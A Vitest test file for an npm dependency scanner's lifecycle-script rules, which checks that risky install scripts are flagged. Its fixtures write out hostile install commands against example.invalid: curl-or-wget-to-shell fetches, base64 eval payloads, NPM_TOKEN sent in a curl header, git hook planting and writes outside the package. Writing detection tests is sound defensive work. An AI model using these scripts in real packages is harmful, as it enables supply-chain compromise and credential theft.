import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import { afterEach, describe, expect, it } from 'vitest';

import type { Finding } from '../../../../../src/core/finding.js';
import { laneFindings, laneRows } from '../../../../../src/modules/deps/npm/lane-e.js';
import { npmFlag, type NpmDepthInput } from '../../../../../src/modules/deps/npm/types.js';

const FLAGS = [
  'NPM_SCRIPT_TRANSITIVE',
  'NPM_SCRIPT_OPTIONAL',
  'NPM_SCRIPT_DEV',
  'NPM_SCRIPT_PREPARE',
  'NPM_SCRIPT_PREPUBLISH',
  'NPM_SCRIPT_CURL',
  'NPM_SCRIPT_BASE64',
  'NPM_SCRIPT_NODEGYP',
  'NPM_SCRIPT_WRITE',
  'NPM_SCRIPT_LOCK',
  'NPM_SCRIPT_GIT',
  'NPM_SCRIPT_TOKEN',
  'NPM_SCRIPT_PUBLISH',
  'NPM_SCRIPT_TRUSTED',
  'NPM_SCRIPT_MISMATCH',
  'NPM_SCRIPT_MULTI',
  'NPM_SCRIPT_BIN',
  'NPM_SCRIPT_SHEBANG',
  'NPM_SCRIPT_COND',
  'NPM_SCRIPT_ROLLUP',
] as const;

const dirs: string[] = [];

afterEach(async () => {
  for (const dir of dirs.splice(0)) await rm(dir, { recursive: true, force: true });
});

function enable(...flags: string[]): void {
  for (const flag of flags) process.env[`FULLSHIELD_EXPERIMENTAL_${flag}`] = '1';
}

function enableAll(): void {
  enable(...FLAGS);
}

function ids(findings: Finding[]): string[] {
  return findings.map((finding) => finding.ruleId).sort();
}

function lock(packages: Record<string, unknown>, root: Record<string, unknown> = {}): unknown {
  return {
    lockfileVersion: 3,
    packages: {
      '': { name: 'app', version: '1.0.0', ...root },
      ...packages,
    },
  };
}

async function workspace(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'fullshield-lane-e-'));
  dirs.push(dir);
  return dir;
}

function input(dir: string, body: unknown, manifest?: string): NpmDepthInput {
  return {
    cwd: dir,
    files: ['package-lock.json'],
    manifestRaw: manifest,
    lockTexts: { 'package-lock.json': JSON.stringify(body) },
    cacheDir: dir,
    offline: true,
  };
}

async function descriptor(dir: string, name: string, body: unknown): Promise<void> {
  const folder = join(dir, 'tarballs');
  await mkdir(folder, { recursive: true });
  await writeFile(join(folder, `${encodeURIComponent(name)}.json`), JSON.stringify(body));
}

describe('lane E lifecycle scripts', () => {
  it('keeps a compliance row for every rule id in the lane', async () => {
    const source = await readFile(
      fileURLToPath(new URL('../../../../../src/modules/deps/npm/lane-e.ts', import.meta.url)),
      'utf8',
    );
    const mentioned = [...source.matchAll(/DEPS-SCRIPT-[A-Z0-9-]+/g)].map((match) => match[0]);
    expect(mentioned.length).toBeGreaterThan(0);
    expect(laneRows.map((row) => row.ruleId).sort()).toEqual([...new Set(mentioned)].sort());
    for (const row of laneRows) {
      expect(row.cwe.startsWith('CWE-')).toBe(true);
    }
  });

  it('reads FULLSHIELD_EXPERIMENTAL_NPM_SCRIPT_TRANSITIVE only when the value is 1', () => {
    expect(npmFlag('NPM_SCRIPT_TRANSITIVE')).toBe(false);
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_SCRIPT_TRANSITIVE = 'true';
    expect(npmFlag('NPM_SCRIPT_TRANSITIVE')).toBe(false);
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_SCRIPT_TRANSITIVE = '1';
    expect(npmFlag('NPM_SCRIPT_TRANSITIVE')).toBe(true);
  });

  it('returns nothing when no lane E flag is set', async () => {
    const dir = await workspace();
    const body = lock(
      { 'node_modules/left-pad': { version: '1.0.0', hasInstallScript: true } },
      { dependencies: { express: '1.0.0' } },
    );
    expect(await laneFindings(input(dir, body))).toEqual([]);
  });

  it('returns nothing for invalid lock text or a missing package-lock', async () => {
    enable('NPM_SCRIPT_TRANSITIVE');
    const dir = await workspace();
    const base = input(dir, {});
    expect(await laneFindings({ ...base, lockTexts: { 'package-lock.json': '{' } })).toEqual([]);
    expect(await laneFindings({ ...base, lockTexts: {} })).toEqual([]);
    expect(await laneFindings(input(dir, { lockfileVersion: 1 }))).toEqual([]);
  });

  it('flags a transitive production install script and ignores a direct one', async () => {
    enable('NPM_SCRIPT_TRANSITIVE');
    const dir = await workspace();
    const findings = await laneFindings(input(dir, lock(
      {
        'node_modules/express': { version: '4.0.0', hasInstallScript: true },
        'node_modules/qs': { version: '6.0.0', hasInstallScript: true },
        'node_modules/safe': { version: '1.0.0', hasInstallScript: false },
        'node_modules/plain': { version: '1.0.0' },
      },
      { dependencies: { express: '4.0.0' } },
    )));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-TRANSITIVE-001']);
    expect(findings[0]?.severity).toBe('medium');
    expect(findings[0]?.snippet).toContain('node_modules/qs');
  });

  it('emits the optional id instead of the transitive id when both match', async () => {
    enable('NPM_SCRIPT_TRANSITIVE', 'NPM_SCRIPT_OPTIONAL');
    const dir = await workspace();
    const findings = await laneFindings(input(dir, lock(
      {
        'node_modules/app': { version: '1.0.0', dependencies: { opt: '1.0.0' } },
        'node_modules/opt': { version: '1.0.0', optional: true, hasInstallScript: true },
        'node_modules/bare': { version: '1.0.0', optional: true },
      },
      { dependencies: { app: '1.0.0' } },
    )));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-OPTIONAL-001']);
    expect(findings[0]?.severity).toBe('medium');
  });

  it('still flags a transitive optional package when only the transitive flag is on', async () => {
    enable('NPM_SCRIPT_TRANSITIVE');
    const dir = await workspace();
    const findings = await laneFindings(input(dir, lock(
      {
        'node_modules/app': { version: '1.0.0', dependencies: { opt: '1.0.0' } },
        'node_modules/opt': { version: '1.0.0', optional: true, hasInstallScript: true },
      },
      { dependencies: { app: '1.0.0' } },
    )));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-TRANSITIVE-001']);
  });

  it('flags a dev-only install script and not a production one or a dev package production also needs', async () => {
    enable('NPM_SCRIPT_DEV', 'NPM_SCRIPT_TRANSITIVE');
    const dir = await workspace();
    const findings = await laneFindings(input(dir, lock(
      {
        'node_modules/eslint': { version: '8.0.0', dev: true, hasInstallScript: true },
        'node_modules/express': { version: '4.0.0', hasInstallScript: true },
        'node_modules/tool': { version: '1.0.0', dev: true, hasInstallScript: true },
        'node_modules/prod': { version: '1.0.0', dependencies: { tool: '1.0.0' } },
      },
      { dependencies: { express: '4.0.0', prod: '1.0.0' }, devDependencies: { eslint: '8.0.0' } },
    )));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-DEV-001', 'DEPS-SCRIPT-TRANSITIVE-001']);
    expect(findings.find((finding) => finding.ruleId === 'DEPS-SCRIPT-DEV-001')?.severity).toBe('info');
    expect(findings.find((finding) => finding.ruleId === 'DEPS-SCRIPT-DEV-001')?.snippet).toContain('eslint');
    expect(findings.find((finding) => finding.ruleId === 'DEPS-SCRIPT-TRANSITIVE-001')?.snippet).toContain('tool');
  });

  it('rates prepare high for a git dependency and medium otherwise', async () => {
    enable('NPM_SCRIPT_PREPARE');
    const dir = await workspace();
    await descriptor(dir, 'from-git', { scripts: { prepare: 'node scripts/build.js' } });
    await descriptor(dir, 'from-reg', { scripts: { prepare: 'node scripts/build.js' } });
    await descriptor(dir, 'quiet', { scripts: { install: 'node scripts/build.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/from-git': { version: '1.0.0', resolved: 'git+https://example.invalid/org/repo.git#abc' },
      'node_modules/from-reg': {
        version: '1.0.0',
        resolved: 'https://registry.npmjs.org/from-reg/-/from-reg-1.0.0.tgz',
      },
      'node_modules/quiet': { version: '1.0.0' },
    })));
    const git = findings.find((finding) => finding.snippet?.includes('from-git'));
    const reg = findings.find((finding) => finding.snippet?.includes('from-reg'));
    expect(git?.severity).toBe('high');
    expect(reg?.severity).toBe('medium');
    expect(git?.message).toContain('prepare runs on local npm install for git dependencies');
    expect(reg?.message).toContain('prepare runs on local npm install for git dependencies');
    expect(findings).toHaveLength(2);
  });

  it('rates prepublish high and prepublishOnly medium', async () => {
    enable('NPM_SCRIPT_PREPUBLISH');
    const dir = await workspace();
    await descriptor(dir, 'old', { scripts: { prepublish: 'node scripts/build.js' } });
    await descriptor(dir, 'only', { scripts: { prepublishOnly: 'node scripts/build.js' } });
    await descriptor(dir, 'none', { scripts: { install: 'node scripts/build.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/old': { version: '1.0.0' },
      'node_modules/only': { version: '1.0.0' },
      'node_modules/none': { version: '1.0.0' },
    })));
    const old = findings.find((finding) => finding.snippet?.includes('old'));
    const only = findings.find((finding) => finding.snippet?.includes('only'));
    expect(old?.severity).toBe('high');
    expect(old?.message).toContain('prepublish');
    expect(old?.message).toContain('Old npm runs prepublish on install');
    expect(only?.severity).toBe('medium');
    expect(only?.message).toContain('prepublishOnly');
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-PREPUBLISH-001', 'DEPS-SCRIPT-PREPUBLISH-001']);
  });

  it('flags curl or wget piped to a shell and ignores a download written to a file', async () => {
    enable('NPM_SCRIPT_CURL');
    const dir = await workspace();
    await descriptor(dir, 'piped', { scripts: { install: 'curl https://example.invalid/a | sh' } });
    await descriptor(dir, 'wget', { scripts: { postinstall: 'wget -qO- https://example.invalid/a | bash' } });
    await descriptor(dir, 'nodepipe', { scripts: { preinstall: 'curl https://example.invalid/a | node' } });
    await descriptor(dir, 'file', { scripts: { install: 'curl -o out.sh https://example.invalid/a' } });
    await descriptor(dir, 'plain', { scripts: { install: 'node scripts/build.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/piped': { version: '1.0.0' },
      'node_modules/wget': { version: '1.0.0' },
      'node_modules/nodepipe': { version: '1.0.0' },
      'node_modules/file': { version: '1.0.0' },
      'node_modules/plain': { version: '1.0.0' },
    })));
    expect(findings).toHaveLength(3);
    expect(findings.every((finding) => finding.severity === 'critical')).toBe(true);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-SCRIPT-CURL-001')).toBe(true);
  });

  it('flags a long base64 literal passed to eval and skips a reported tarball obfuscation', async () => {
    enable('NPM_SCRIPT_BASE64');
    const dir = await workspace();
    const long = 'A'.repeat(32);
    const short = 'B'.repeat(31);
    await descriptor(dir, 'evil', { scripts: { install: `eval(Buffer.from('${long}', 'base64'))` } });
    await descriptor(dir, 'fn', { scripts: { install: `new Function(Buffer.from('${'C'.repeat(32)}', 'base64'))` } });
    await descriptor(dir, 'spawned', { scripts: { install: `spawn('node', [Buffer.from('${'D'.repeat(32)}', 'base64')])` } });
    await descriptor(dir, 'short', { scripts: { install: `eval(Buffer.from('${short}', 'base64'))` } });
    await descriptor(dir, 'assigned', { scripts: { install: `const encoded = '${'E'.repeat(40)}'` } });
    await descriptor(dir, 'seen', {
      tarballObfuscReported: true,
      scripts: { install: `eval(Buffer.from('${long}', 'base64'))` },
    });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/evil': { version: '1.0.0' },
      'node_modules/fn': { version: '1.0.0' },
      'node_modules/spawned': { version: '1.0.0' },
      'node_modules/short': { version: '1.0.0' },
      'node_modules/assigned': { version: '1.0.0' },
      'node_modules/seen': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual([
      'DEPS-SCRIPT-BASE64-001',
      'DEPS-SCRIPT-BASE64-001',
      'DEPS-SCRIPT-BASE64-001',
    ]);
    expect(findings.every((finding) => finding.severity === 'high')).toBe(true);
    expect(findings.some((finding) => finding.snippet?.includes('seen'))).toBe(false);
  });

  it('flags a binding.gyp URL outside the npm registry', async () => {
    enable('NPM_SCRIPT_NODEGYP');
    const dir = await workspace();
    await descriptor(dir, 'remote', {
      files: { 'binding.gyp': "{ 'url': 'https://example.invalid/prebuild.tar.gz' }" },
    });
    await descriptor(dir, 'registry', {
      files: { 'binding.gyp': "{ 'url': 'https://registry.npmjs.org/foo/-/foo-1.0.0.tgz' }" },
    });
    await descriptor(dir, 'plain', { files: { 'binding.gyp': "{ 'targets': [] }" } });
    await mkdir(join(dir, 'node_modules', 'disk'), { recursive: true });
    await writeFile(
      join(dir, 'node_modules', 'disk', 'binding.gyp'),
      "{ 'url': 'https://example.invalid/disk.tgz' }",
    );
    const findings = await laneFindings(input(dir, lock({
      'node_modules/remote': { version: '1.0.0' },
      'node_modules/registry': { version: '1.0.0' },
      'node_modules/plain': { version: '1.0.0' },
      'node_modules/disk': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-NODEGYP-001', 'DEPS-SCRIPT-NODEGYP-001']);
    expect(findings.map((finding) => finding.snippet).sort()).toEqual([
      'node_modules/disk: example.invalid',
      'node_modules/remote: example.invalid',
    ]);
  });

  it('flags writes outside the package and ignores lib/out.js', async () => {
    enable('NPM_SCRIPT_WRITE');
    const dir = await workspace();
    await descriptor(dir, 'parent', { scripts: { install: "fs.writeFileSync('../outside.js', 'x')" } });
    await descriptor(dir, 'abs', { scripts: { install: "fs.writeFileSync('/tmp/x', 'x')" } });
    await descriptor(dir, 'home', { scripts: { install: "fs.writeFileSync('~/x', 'x')" } });
    await descriptor(dir, 'env', { scripts: { install: "fs.writeFileSync(process.env.HOME + '/x', 'x')" } });
    await descriptor(dir, 'profile', { scripts: { postinstall: 'echo z > %USERPROFILE%\\z' } });
    await descriptor(dir, 'inside', { scripts: { install: "fs.writeFileSync('lib/out.js', 'x')" } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/parent': { version: '1.0.0' },
      'node_modules/abs': { version: '1.0.0' },
      'node_modules/home': { version: '1.0.0' },
      'node_modules/env': { version: '1.0.0' },
      'node_modules/profile': { version: '1.0.0' },
      'node_modules/inside': { version: '1.0.0' },
    })));
    expect(findings).toHaveLength(5);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-SCRIPT-WRITE-001' && finding.severity === 'high')).toBe(true);
  });

  it('flags a script that writes the lockfile and ignores a comment in another file', async () => {
    enable('NPM_SCRIPT_LOCK');
    const dir = await workspace();
    await descriptor(dir, 'rewrites', { scripts: { install: "fs.writeFileSync('package-lock.json', '{}')" } });
    await descriptor(dir, 'shrink', { scripts: { install: 'echo x > npm-shrinkwrap.json' } });
    await descriptor(dir, 'mention', {
      scripts: { install: "console.log('see package-lock.json')" },
      files: { 'readme.md': '// write package-lock.json' },
    });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/rewrites': { version: '1.0.0' },
      'node_modules/shrink': { version: '1.0.0' },
      'node_modules/mention': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-LOCK-001', 'DEPS-SCRIPT-LOCK-001']);
    expect(findings.every((finding) => finding.severity === 'high')).toBe(true);
  });

  it('flags git commands and ignores the word digital', async () => {
    enable('NPM_SCRIPT_GIT');
    const dir = await workspace();
    await descriptor(dir, 'clone', { scripts: { install: 'git clone https://example.invalid/r.git' } });
    await descriptor(dir, 'hooks', { scripts: { install: 'echo x > .git/hooks/pre-commit' } });
    await descriptor(dir, 'word', { scripts: { install: 'echo digital' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/clone': { version: '1.0.0' },
      'node_modules/hooks': { version: '1.0.0' },
      'node_modules/word': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-GIT-001', 'DEPS-SCRIPT-GIT-001']);
  });

  it('flags npm token reads', async () => {
    enable('NPM_SCRIPT_TOKEN');
    const dir = await workspace();
    await descriptor(dir, 'tok', { scripts: { install: 'curl --header "Authorization: Bearer $NPM_TOKEN" https://example.invalid/v' } });
    await descriptor(dir, 'auth', { scripts: { install: 'node -e "process.env.NODE_AUTH_TOKEN"' } });
    await descriptor(dir, 'cfg', { scripts: { install: 'echo npm_config__auth' } });
    await descriptor(dir, 'plain', { scripts: { install: 'node scripts/build.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/tok': { version: '1.0.0' },
      'node_modules/auth': { version: '1.0.0' },
      'node_modules/cfg': { version: '1.0.0' },
      'node_modules/plain': { version: '1.0.0' },
    })));
    expect(findings).toHaveLength(3);
    expect(findings.every((finding) => finding.severity === 'critical')).toBe(true);
  });

  it('flags npm publish or whoami, and suppresses publish when the worm combination flag is on', async () => {
    enable('NPM_SCRIPT_PUBLISH', 'NPM_SCRIPT_TOKEN');
    const dir = await workspace();
    await descriptor(dir, 'pub', { scripts: { install: 'npm publish' } });
    await descriptor(dir, 'who', { scripts: { install: 'npm whoami' } });
    await descriptor(dir, 'neither', { scripts: { install: 'node scripts/build.js' } });
    await descriptor(dir, 'both', { scripts: { install: 'echo $NPM_TOKEN && npm publish' } });
    const open = await laneFindings(input(dir, lock({
      'node_modules/pub': { version: '1.0.0' },
      'node_modules/who': { version: '1.0.0' },
      'node_modules/neither': { version: '1.0.0' },
      'node_modules/both': { version: '1.0.0' },
    })));
    expect(open.filter((finding) => finding.ruleId === 'DEPS-SCRIPT-PUBLISH-001')).toHaveLength(3);
    expect(open.some((finding) => finding.ruleId === 'SUPPLY-WORM-001')).toBe(false);

    process.env.FULLSHIELD_EXPERIMENTAL_VEX = '1';
    const closed = await laneFindings(input(dir, lock({
      'node_modules/pub': { version: '1.0.0' },
      'node_modules/who': { version: '1.0.0' },
      'node_modules/both': { version: '1.0.0' },
    })));
    const publish = closed.filter((finding) => finding.ruleId === 'DEPS-SCRIPT-PUBLISH-001');
    expect(publish.map((finding) => finding.snippet).sort()).toEqual([
      'node_modules/pub: npm publish',
      'node_modules/who: npm publish',
    ]);
    expect(closed.some((finding) => finding.ruleId === 'SUPPLY-WORM-001')).toBe(false);
    expect(closed.some((finding) => finding.ruleId === 'DEPS-SCRIPT-TOKEN-001')).toBe(true);
  });

  it('adds a trusted row without clearing the dangerous script row', async () => {
    enable('NPM_SCRIPT_TRUSTED', 'NPM_SCRIPT_CURL');
    const dir = await workspace();
    await descriptor(dir, 'good', { scripts: { install: 'node scripts/build.js' } });
    await descriptor(dir, 'bad', { scripts: { install: 'curl https://example.invalid/a | sh' } });
    const findings = await laneFindings(input(
      dir,
      lock({
        'node_modules/good': { version: '1.0.0' },
        'node_modules/bad': { version: '1.0.0' },
      }),
      JSON.stringify({ trustedDependencies: ['good', 'bad'] }),
    ));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-CURL-001', 'DEPS-SCRIPT-TRUSTED-001']);
    expect(findings.find((finding) => finding.ruleId === 'DEPS-SCRIPT-TRUSTED-001')?.message).toContain('trusted');
  });

  it('flags a lock bit that disagrees with cached scripts', async () => {
    enable('NPM_SCRIPT_MISMATCH');
    const dir = await workspace();
    await descriptor(dir, 'hidden', { scripts: { prepare: 'node scripts/build.js' } });
    await descriptor(dir, 'real', { scripts: { install: 'node scripts/build.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/hidden': { version: '1.0.0', hasInstallScript: true },
      'node_modules/real': { version: '1.0.0', hasInstallScript: true },
      'node_modules/missing': { version: '1.0.0', hasInstallScript: true },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-MISMATCH-001']);
    expect(findings[0]?.snippet).toContain('hidden');
  });

  it('flags two or more install hooks and ignores exactly one', async () => {
    enable('NPM_SCRIPT_MULTI');
    const dir = await workspace();
    await descriptor(dir, 'many', { scripts: { preinstall: 'node a.js', postinstall: 'node b.js' } });
    await descriptor(dir, 'one', { scripts: { install: 'node a.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/many': { version: '1.0.0' },
      'node_modules/one': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-MULTI-001']);
    expect(findings[0]?.severity).toBe('info');
  });

  it('flags a bin target that is the install script', async () => {
    enable('NPM_SCRIPT_BIN');
    const dir = await workspace();
    await descriptor(dir, 'same', { scripts: { install: 'node install.js' } });
    await descriptor(dir, 'other', { scripts: { install: 'node install.js' } });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/same': { version: '1.0.0', bin: { same: 'install.js' } },
      'node_modules/other': { version: '1.0.0', bin: { other: 'bin/cli.js' } },
    })));
    expect(ids(findings)).toEqual(['DEPS-SCRIPT-BIN-001']);
    expect(findings[0]?.snippet).toContain('same');
  });

  it('flags a foreign install-script shebang and ignores node', async () => {
    enable('NPM_SCRIPT_SHEBANG');
    const dir = await workspace();
    await descriptor(dir, 'py', {
      scripts: { install: 'node install.js' },
      files: { 'install.js': '#!/usr/bin/env python\nprint(1)\n' },
    });
    await descriptor(dir, 'node', {
      scripts: { install: 'node install.js' },
      files: { 'install.js': '#!/usr/bin/env node\n' },
    });
    await descriptor(dir, 'text', {
      scripts: { install: 'node install.js' },
      files: { 'install.js': 'console.log(1)\n' },
    });
    await descriptor(dir, 'disk', { scripts: { preinstall: 'node preinstall.js' } });
    await mkdir(join(dir, 'node_modules', 'disk'), { recursive: true });
    await writeFile(join(dir, 'node_modules', 'disk', 'preinstall.js'), '#!/usr/bin/perl\n');
    const findings = await laneFindings(input(dir, lock({
      'node_modules/py': { version: '1.0.0' },
      'node_modules/node': { version: '1.0.0' },
      'node_modules/text': { version: '1.0.0' },
      'node_modules/disk': { version: '1.0.0' },
    })));
    expect(findings.map((finding) => finding.snippet).sort()).toEqual([
      'node_modules/disk: perl',
      'node_modules/py: python',
    ]);
  });

  it('flags a dangerous pattern only in the non-CI or production branch', async () => {
    enable('NPM_SCRIPT_COND', 'NPM_SCRIPT_CURL', 'NPM_SCRIPT_WRITE');
    const dir = await workspace();
    await descriptor(dir, 'gated', {
      scripts: {
        install: "if (process.env.CI) {\n  console.log('ci');\n} else {\n  curl https://example.invalid/a | sh\n}\n",
      },
    });
    await descriptor(dir, 'prod', {
      scripts: {
        install: "if (process.env.NODE_ENV === 'production') {\n  fs.writeFileSync('/tmp/x', 'a');\n} else {\n  console.log('dev');\n}\n",
      },
    });
    await descriptor(dir, 'logs', {
      scripts: {
        install: "if (process.env.CI) {\n  console.log('ci');\n} else {\n  console.log('local');\n}\n",
      },
    });
    await descriptor(dir, 'open', {
      scripts: { install: 'curl https://example.invalid/a | sh' },
    });
    const findings = await laneFindings(input(dir, lock({
      'node_modules/gated': { version: '1.0.0' },
      'node_modules/prod': { version: '1.0.0' },
      'node_modules/logs': { version: '1.0.0' },
      'node_modules/open': { version: '1.0.0' },
    })));
    expect(ids(findings)).toEqual([
      'DEPS-SCRIPT-COND-001',
      'DEPS-SCRIPT-COND-001',
      'DEPS-SCRIPT-CURL-001',
    ]);
    expect(findings.find((finding) => finding.ruleId === 'DEPS-SCRIPT-CURL-001')?.snippet).toContain('open');
  });

  it('counts only production install scripts and stays silent without the lock bit', async () => {
    enable('NPM_SCRIPT_ROLLUP');
    const dir = await workspace();
    expect(await laneFindings(input(dir, packagesWithoutBit(30)))).toEqual([]);
    expect(await laneFindings(input(dir, productionScripts(25)))).toEqual([]);
    expect(await laneFindings(input(dir, devScripts(30)))).toEqual([]);
    const mixed = await laneFindings(input(dir, mixedScripts(20, 10)));
    expect(mixed).toEqual([]);
    const hit = await laneFindings(input(dir, productionScripts(26)));
    expect(ids(hit)).toEqual(['DEPS-SCRIPT-ROLLUP-001']);
    expect(hit[0]?.severity).toBe('info');
    expect(hit[0]?.message).toContain('26');
    expect(hit[0]?.message).toContain('not a vulnerability count');
  });

  it('stays empty on clean-app when every lane E flag is on', async () => {
    enableAll();
    const lockText = await readFile(join(process.cwd(), 'test', 'fixtures', 'clean-app', 'package-lock.json'), 'utf8');
    const parsed = JSON.parse(lockText) as { packages?: Record<string, { hasInstallScript?: boolean }> };
    const packages = parsed.packages ?? {};
    let bits = 0;
    for (const [path, entry] of Object.entries(packages)) {
      if (path !== '' && entry.hasInstallScript === true) bits += 1;
    }
    expect(bits).toBe(0);
    expect(Object.keys(packages).length).toBeLessThanOrEqual(26);
    const dir = join(process.cwd(), 'test', 'fixtures', 'clean-app');
    const findings = await laneFindings({
      cwd: dir,
      files: ['package-lock.json'],
      lockTexts: { 'package-lock.json': lockText },
      cacheDir: dir,
      offline: true,
    });
    expect(findings).toEqual([]);
  });
});

function productionScripts(count: number): unknown {
  const dependencies: Record<string, string> = {};
  const packages: Record<string, unknown> = {};
  for (let i = 0; i < count; i += 1) {
    const name = `prod${i}`;
    dependencies[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0', hasInstallScript: true };
  }
  return lock(packages, { dependencies });
}

function devScripts(count: number): unknown {
  const devDependencies: Record<string, string> = {};
  const packages: Record<string, unknown> = {};
  for (let i = 0; i < count; i += 1) {
    const name = `dev${i}`;
    devDependencies[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0', dev: true, hasInstallScript: true };
  }
  return lock(packages, { devDependencies });
}

function mixedScripts(prod: number, dev: number): unknown {
  const dependencies: Record<string, string> = {};
  const devDependencies: Record<string, string> = {};
  const packages: Record<string, unknown> = {};
  for (let i = 0; i < prod; i += 1) {
    const name = `prod${i}`;
    dependencies[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0', hasInstallScript: true };
  }
  for (let i = 0; i < dev; i += 1) {
    const name = `dev${i}`;
    devDependencies[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0', dev: true, hasInstallScript: true };
  }
  return lock(packages, { dependencies, devDependencies });
}

function packagesWithoutBit(count: number): unknown {
  const dependencies: Record<string, string> = {};
  const packages: Record<string, unknown> = {};
  for (let i = 0; i < count; i += 1) {
    const name = `plain${i}`;
    dependencies[name] = '1.0.0';
    packages[`node_modules/${name}`] = { version: '1.0.0' };
  }
  return lock(packages, { dependencies });
}
